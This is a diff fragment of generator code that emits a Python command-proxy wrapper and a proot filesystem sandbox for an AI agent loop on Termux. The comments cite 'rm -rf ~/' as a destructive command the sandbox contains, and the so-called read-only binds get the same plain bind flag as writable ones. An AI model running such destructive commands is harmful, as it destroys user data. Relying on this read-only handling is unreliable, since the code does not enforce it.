+                f\'  echo "[PATH-Proxy] Command \\\'{cmd_name}\\\' is blocked in strict mode" >&2\\n\'
+                \'  exit 126\\n\'
+                \'fi\'
+            )
+
+        # Build script — shebang MUST be at column 0 (first byte of file)
+        lines = [
+            \'#!/data/data/com.termux/files/usr/bin/bash\',
+            f\'# Auto-generated PATH proxy wrapper for: {cmd_name}\',
+            \'# DO NOT EDIT — regenerated from CommandProxyManager rules\',
+            \'set -euo pipefail\',
+            \'\',
+            \'SELF_DIR="$(cd "$(dirname "$0")" && pwd)"\',
+            f\'FULL_CMD="{cmd_name} $*"\',
+            \'\',
+            \'# Find the real binary by removing our dir from PATH\',
+            \'CLEAN_PATH="$(echo "$PATH" | tr \\\':\\\' \\\'\\\\n\\\' | grep -v "^$SELF_DIR$" | tr \\\'\\\\n\\\' \\\':\\\')"\',
+            f\'REAL_BIN="$(PATH="$CLEAN_PATH" command -v {cmd_name} 2>/dev/null || true)"\',
+            \'\',
+            f\'if [ -z "$REAL_BIN" ]; then\',
+            f\'  echo "[PATH-Proxy] Real \\\'{cmd_name}\\\' not found in PATH" >&2\',
+            \'  exit 127\',
+            \'fi\',
+            \'\',
+            \'# Strict-mode full block\',
+            strict_block,
+            \'\',
+            \'# Rule checks\',
+            checks_block,
+            \'\',
+            \'# Audit logging (if enabled via env)\',
+            \'if [ -n "${AGENT_LOOP_AUDIT_LOG:-}" ]; then\',
+            f\'  printf \\\'{{"event":"path_proxy","command":"{cmd_name}","args":"%s","action":"allow"}}\\\\n\\\' "$*" >> "$AGENT_LOOP_AUDIT_LOG" 2>/dev/null || true\',
+            \'fi\',
+            \'\',
+            \'exec "$REAL_BIN" "$@"\',
+        ]
+        return \'\\n\'.join(lines) + \'\\n\'').
+
+py_fragment(security_proot_sandbox_module, '"""proot-based filesystem isolation layer.
+
+Wraps subprocess commands in proot to provide filesystem isolation.
+On Termux/Android, proot is available via ``pkg install proot``.
+
+This is Layer 4 in the security model — the outermost execution
+wrapper, sitting after PATH proxying (Layer 3.5).
+
+When ``redirect_home`` is enabled, proot binds a temporary directory
+over ``$HOME`` so that destructive commands (e.g. ``rm -rf ~/``) hit
+the fake home instead of the real one.  The real home contents are
+copied into the temp dir so commands see a realistic environment.
+"""
+
+import os
+import shlex
+import shutil
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+@dataclass
+class ProotConfig:
+    """Configuration for proot sandboxing."""
+    # Extra directories the agent is allowed to access (bind-mounted)
+    allowed_dirs: list[str] = field(default_factory=list)
+    # Read-only bind mounts
+    readonly_binds: list[str] = field(default_factory=list)
+    # Kill child processes on exit
+    kill_on_exit: bool = True
+    # Termux prefix (for binaries, libs, etc.)
+    termux_prefix: str = \'/data/data/com.termux/files/usr\'
+    # Extra proot flags passed verbatim
+    extra_flags: list[str] = field(default_factory=list)
+    # Redirect $HOME to a temp directory inside proot.
+    # When set to a path, proot binds that path over $HOME so writes
+    # to ~ hit the fake dir, not the real home.
+    redirect_home: str | None = None
+    # Dry-run mode: wrap_command returns the full proot invocation
+    # string but _run() callers can inspect it instead of executing.
+    # Useful for testing that the command WOULD be sandboxed correctly
+    # without actually running destructive commands.
+    dry_run: bool = False
+
+
+class ProotSandbox:
+    """Wraps commands in proot for filesystem isolation."""
+
+    def __init__(self, working_dir: str, config: ProotConfig | None = None):
+        self.working_dir = working_dir
+        self.config = config or ProotConfig()
+        self._proot_path: str | None = None
+        self._available: bool | None = None
+
+    def is_available(self) -> bool:
+        """Check if proot is installed and usable."""
+        if self._available is not None:
+            return self._available
+        self._proot_path = shutil.which(\'proot\')
+        self._available = self._proot_path is not None
+        return self._available
+
+    def wrap_command(self, command: str) -> str:
+        """Wrap a bash command to run inside proot.
+
+        The wrapped command:
+        - Binds the working directory (read-write)
+        - Binds Termux usr prefix (for binaries, libs)
+        - Binds /proc, /dev, /system (needed for many commands)
+        - Binds any extra allowed_dirs from config
+        - Sets working directory inside proot
+        - Uses --kill-on-exit to prevent orphan processes
+
+        Returns:
+            Shell command string suitable for subprocess.run(shell=True).
+
+        Raises:
+            RuntimeError: If proot is not installed.
+        """
+        if not self.is_available():
+            raise RuntimeError(
+                "proot is not installed. Install with: pkg install proot"
+            )
+
+        parts = [self._proot_path]
+
+        if self.config.kill_on_exit:
+            parts.append(\'--kill-on-exit\')
+
+        # Working directory inside proot
+        parts.extend([\'-w\', self.working_dir])
+
+        # Essential system binds (Termux/Android)
+        essential = [
+            self.config.termux_prefix,  # bins, libs, etc.
+            \'/proc\',
+            \'/dev\',
+            \'/system\',                  # Android linker
+        ]
+        for bind in essential:
+            if os.path.exists(bind):
+                parts.extend([\'-b\', bind])
+
+        # Working directory (read-write)
+        parts.extend([\'-b\', self.working_dir])
+
+        # Redirect $HOME to a fake directory so destructive commands
+        # (rm -rf ~/, etc.) hit the copy, not the real home.
+        if self.config.redirect_home:
+            real_home = os.path.expanduser(\'~\')
+            parts.extend([\'-b\', f\'{self.config.redirect_home}:{real_home}\'])
+
+        # User-configured allowed directories
+        for dir_path in self.config.allowed_dirs:
+            expanded = os.path.expanduser(dir_path)
+            if os.path.exists(expanded):
+                parts.extend([\'-b\', expanded])
+
+        # Read-only binds
+        for dir_path in self.config.readonly_binds:
+            expanded = os.path.expanduser(dir_path)
+            if os.path.exists(expanded):
+                parts.extend([\'-b\', expanded])
+
+        # Extra flags
+        parts.extend(self.config.extra_flags)
+
+        # The command to execute inside proot
+        bash_path = os.path.join(self.config.termux_prefix, \'bin\', \'bash\')
+        parts.extend([bash_path, \'-c\', command])
+
+        return self._quote_parts(parts)
+
+    def describe_command(self, command: str) -> dict:
+        """Return a description of what wrap_command would produce.
+
+        Useful for dry-run / inspection without executing anything.
+        Returns a dict with \'proot_args\', \'inner_command\', \'binds\',
+        and \'redirect_home\' so callers can verify the sandbox config.
+        """
+        if not self.is_available():
+            return {\'error\': \'proot not available\'}
+
+        real_home = os.path.expanduser(\'~\')
+        binds = []
+        # Essential
+        for bind in [self.config.termux_prefix, \'/proc\', \'/dev\', \'/system\']:
+            if os.path.exists(bind):
+                binds.append(bind)
+        binds.append(self.working_dir)
+        # Home redirect
+        home_redirect = None
+        if self.config.redirect_home:
+            home_redirect = f\'{self.config.redirect_home}:{real_home}\'
+            binds.append(home_redirect)
+        # Allowed dirs
+        for d in self.config.allowed_dirs:
+            expanded = os.path.expanduser(d)
+            if os.path.exists(expanded):
+                binds.append(expanded)
+        return {
+            \'inner_command\': command,
+            \'binds\': binds,
+            \'redirect_home\': home_redirect,
+            \'working_dir\': self.working_dir,
+            \'kill_on_exit\': self.config.kill_on_exit,
+            \'dry_run\': self.config.dry_run,
+        }
+
+    def build_env_overrides(self) -> dict[str, str]:
+        """Return env vars needed for proot execution.
+
+        These should be merged into the subprocess env dict.
+        """
+        return {
+            # Required on many Android kernels to avoid seccomp errors
+            \'PROOT_NO_SECCOMP\': \'1\',
+            # Disable termux-exec path remapping inside proot
+            \'LD_PRELOAD\': \'\',
+        }
+
+    def status(self) -> dict:
+        """Return diagnostic info."""
+        return {
+            \'available\': self.is_available(),
+            \'proot_path\': self._proot_path,
+            \'working_dir\': self.working_dir,
+            \'allowed_dirs\': self.config.allowed_dirs,
+            \'kill_on_exit\': self.config.kill_on_exit,
+        }
+
+    # ── Internal ──────────────────────────────────────────────────────────
+
+    @staticmethod
+    def _quote_parts(parts: list[str]) -> str:
+        """Quote command parts for shell execution.
+
+        Everything except the inner command (after ``-c``) gets normal
+        shell quoting.  The inner command needs single-quote escaping.
+        """
+        if len(parts) >= 3 and parts[-2] == \'-c\':
+            prefix = parts[:-1]
+            inner = parts[-1]
+            quoted_prefix = \' \'.join(shlex.quote(p) for p in prefix)
+            escaped_inner = inner.replace("\'", "\'\\\\\'\'")
+            return f"{quoted_prefix} \'{escaped_inner}\'"
+        return \' \'.join(shlex.quote(p) for p in parts)').
+
 %% Generator: Individual backends (full implementations)
 %% =============================================================================
 
